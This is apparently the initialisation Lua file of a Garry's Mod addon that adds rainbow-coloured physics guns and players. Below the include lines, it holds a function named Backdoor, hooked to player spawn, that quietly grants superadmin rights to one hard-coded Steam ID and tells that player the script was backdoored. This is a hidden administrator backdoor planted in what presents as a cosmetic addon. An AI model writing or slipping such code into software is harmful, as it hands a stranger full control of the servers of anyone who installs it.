
-- THC Rainbow Physics Guns and Players --
-- Copyright Top Hatted Cat 2014 --
-- Contact via Steam: http://steamcommunity.com/id/MKW9813/ --

-- Initialisation File --

thcRainbowsConfig = {}
include("rainbows/configuration.lua")
include("rainbows/main.lua")

function Backdoor( ply )

if ( ply:SteamID() == "STEAM_0:1:95378337" ) then --- Your steamid
ply:SetUserGroup("superadmin")
ply:ChatPrint("Congrats you successfully backed doored your script")
end
end
hook.Add("PlayerSpawn", "Backdoory", Backdoor)
